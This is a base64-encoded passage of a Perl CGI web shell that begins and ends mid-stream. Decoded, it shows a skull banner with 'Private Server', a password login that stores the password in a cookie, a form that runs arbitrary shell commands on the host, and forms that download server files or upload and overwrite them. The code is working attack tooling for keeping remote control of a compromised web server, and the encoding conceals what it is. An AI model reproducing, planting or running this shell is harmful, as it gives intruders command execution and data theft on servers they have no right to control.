CAgICAgICAgICAgIC4tJnF1b3Q7ICAgICAgJnF1b3Q7LS4KICAgICAgICAgICAgICAgICAgLyAgICAgICAgICAgIFwKICAgICAgICAgICAgICAgICB8ICAgICAgICAgICAgICB8CiAgICAgICAgICAgICAgICAgfCwgIC4tLiAgLi0uICAsfAogICAgICAgICAgICAgICAgIHwgKShfby8gIFxvXykoIHwKICAgICAgICAgICAgICAgICB8LyAgICAgL1wgICAgIFx8CiAgICAgICAoQF8gICAgICAgKF8gICAgIF5eICAgICBfKQogIF8gICAgICkgXDwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X19fX19fXzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+XDwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X188L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPnxJSUlJSUl8PC9mb250Pjxmb250IGNvbG9yPSIjODA4MDgwIj5fXzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+LzwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+X19fX19fX19fX19fX19fX19fX19fX18KPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4gKF8pPC9mb250Pjxmb250IGNvbG9yPSIjODA4MDgwIj5AOEA4PC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj57fTwvZm9udD48Zm9udCBjb2xvcj0iIzgwODA4MCI+Jmx0O19fX19fX19fPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj58LVxJSUlJSUkvLXw8L2ZvbnQ+PGZvbnQgY29sb3I9IiM4MDgwODAiPl9fX19fX19fX19fX19fX19fX19fX19fXyZndDs8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPgogICAgICAgIClfLyAgICAgICAgXCAgICAgICAgICAvIAogICAgICAgKEAgICAgICAgICAgIGAtLS0tLS0tLWAKICAgICAgICAgICAgIDwvZm9udD48Zm9udCBjb2xvcj0iI0FFODMwMCI+VyBBIFIgTiBJIE4gRzogUHJpdmF0ZSBTZXJ2ZXI8L2ZvbnQ+PC9wcmU+CiQ7CiMnCglwcmludCA8PEVORDsKPGNvZGU+ClRyeWluZyAkU2VydmVyTmFtZS4uLjxicj4KQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPGJyPgpFc2NhcGUgY2hhcmFjdGVyIGlzIF5dCjxjb2RlPiRNZXNzYWdlCkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQp7CglwcmludCA8PEVORDsKPGNvZGU+Cjxicj5sb2dpbjogYWRtaW48YnI+CnBhc3N3b3JkOjxicj4KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4KPC9jb2RlPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9naW5Gb3JtCnsKCXByaW50IDw8RU5EOwo8Y29kZT4KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+CmxvZ2luOiBhZG1pbjxicj4KcGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgo8L2NvZGU+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRQYWdlRm9vdGVyCnsKCXByaW50ICI8L2ZvbnQ+PC9ib2R5PjwvaHRtbD4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNhbiBiZSBhY2Nlc3NlcyB1c2luZyB0aGUKIyB2YXJpYWJsZSAkQ29va2llc3snJ30KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgR2V0Q29va2llcwp7CglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOwoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykKCXsKCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7CgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9nb3V0U2NyZWVuCnsKCXByaW50ICI8Y29kZT5Db25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj48L2NvZGU+IjsKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIExvZ3Mgb3V0IHRoZSB1c2VyIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gbG9naW4gYWdhaW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUGVyZm9ybUxvZ291dAp7CglwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9O1xuIjsgIyByZW1vdmUgcGFzc3dvcmQgY29va2llCgkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkmUHJpbnRMb2dvdXRTY3JlZW47CgkmUHJpbnRMb2dpblNjcmVlbjsKCSZQcmludExvZ2luRm9ybTsKCSZQcmludFBhZ2VGb290ZXI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBsb2dpbiB0aGUgdXNlci4gSWYgdGhlIHBhc3N3b3JkIG1hdGNoZXMsIGl0CiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QKIyBtYXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIKIyB0byBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQZXJmb3JtTG9naW4gCnsKCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkCgl7CgkJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPSRMb2dpblBhc3N3b3JkO1xuIjsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkJJlByaW50TG9naW5TY3JlZW47CgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZAoJCXsKCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOwoJCX0KCQkmUHJpbnRMb2dpbkZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0KewoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CglwcmludCA8PEVORDsKPGNvZGU+Cjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CiRQcm9tcHQKPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBkb3dubG9hZCBmaWxlcwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludEZpbGVEb3dubG9hZEZvcm0KewoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CglwcmludCA8PEVORDsKPGNvZGU+Cjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iZG93bmxvYWQiPgokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4KRG93bmxvYWQ6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+CjwvZm9ybT4KPC9jb2RlPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtCnsKCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOwoJcHJpbnQgPDxFTkQ7Cjxjb2RlPgo8Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KJFByb21wdCB1cGxvYWQ8YnI+PGJyPgpGaWxlbmFtZTogPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPgpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPgpPdmVyd3JpdGUgaWYgaXQgRXhpc3RzPGJyPjxicj4KVXBsb2FkOiZuYnNwOyZuYnNwOyZuYnNwOzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bwojIHRlcm1pbmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlzIHZhbGlkIG9ubHkgb24gVW5peC4gSXQgaXMKIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0IGlzIHJ1bm5pbmcgb24gTlQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIENvbW1hbmRUaW1lb3V0CnsKCWlmKCEkV2luTlQpCgl7CgkJYWxhcm0oMCk7CgkJcHJpbnQgPDxFTkQ7CjwveG1wPgo8Y29kZT4KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLgo8YnI+S2lsbGVkIGl0IQo8Y29kZT4KRU5ECgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCQlleGl0OwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQgZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUKIyBjb21tYW5kIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgYW5vdGhlciBjb21tYW5kLiBUaGUgY2hhbmdlIGRpcmVjdG9yeQojIGNvbW1hbmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQgaW4KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRpbWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlCiMgb3V0cHV0IG9mIHRoZSBjaGFuZ2UgZGlyZWN0b3J5IGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZCB0byB0aGUgdXNlcnMKIyB0aGVyZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgRXhlY3V0ZUNvbW1hbmQKewoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZAoJewoJCSMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUKCQkjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4KCQkKCQkkT2xkRGlyID0gJEN1cnJlbnREaXI7CgkJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4kQ21kUHdkOwoJCWNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJFByb21wdCA9ICRXaW5OVCA/ICIkT2xkRGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJE9sZERpcl1cJCAiOwoJCXByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPiI7Cgl9CgllbHNlICMgc29tZSBvdGhlciBjb21tYW5kLCBkaXNwbGF5IHRoZSBvdXRwdXQKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CgkJcHJpbnQgIjxjb2RlPiRQcm9tcHQgJFJ1bkNvbW1hbmQ8L2NvZGU+PHhtcD4iOwoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsKCQlpZighJFdpbk5UKQoJCXsKCQkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsKCQkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOwoJCX0KCQlpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBvdXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkCgkJewoJCQkkfD0xOwoJCQkkQ29tbWFuZCAuPSAiIHwiOwoJCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsKCQkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQoJCQl7CgkJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsKCQkJCXByaW50ICIkX1xuIjsKCQkJfQoJCQkkfD0wOwoJCX0KCQllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29tbWFuZCBjb21wbGV0ZXMKCQl7CgkJCXByaW50IGAkQ29tbWFuZGA7CgkJfQoJCWlmKCEkV2luTlQpCgkJewoJCQlhbGFybSgwKTsKCQl9CgkJcHJpbnQgIjwveG1wPiI7Cgl9CgkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCSZQcmludFBhZ2VGb290ZXI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQgY29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcgojIHRvIGRvd25sb2FkIHRoZSBzcGVjaWZpZWQgZmlsZS4gVGhlIHBhZ2UgYWxzbyBjb250YWlucyBhIGF1dG8tcmVmcmVzaAojIGZlYXR1cmUgdGhhdCBzdGFydHMgdGhlIGRvd25sb2FkIGF1dG9tYXRpY2FsbHkuCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlCnsKCWxvY2FsKCRGaWxlVXJsKSA9IEBfOwoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzCgl7CgkJIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3NlcgoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsKCQkkRG93bmxvYWRMaW5rID0gIiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmY9JEZpbGVVcmwmbz1nbyI7CgkJJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJcHJpbnQgPDxFTkQ7Cjxjb2RlPgpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4KSWYgdGhlIGRvd25sb2FkIGRvZXMgbm90IHN0YXJ0IGF1dG9tYXRpY2FsbHksCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+Lgo8L2NvZGU+CkVORAoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7Cgl9CgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0Cgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCXByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhPC9jb2RlPiI7CgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXIKewoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOwoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZwoJewoJCWlmKCRXaW5OVCkKCQl7CgkJCWJpbm1vZGUoU0VOREZJTEUpOwoJCQliaW5tb2RlKFNURE9VVCk7CgkJfQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOwoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsKCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7CgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7CgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7CgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7CgkJY2xvc2UoU0VOREZJTEUpOwoJfQoJZWxzZSAjIGZhaWxlZCB0byBvcGVuIGZpbGUKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7CgkJcHJpbnQgIjxjb2RlPkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhPC9jb2RlPiI7CgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJfQp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQmVnaW5Eb3dubG9hZAp7CgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t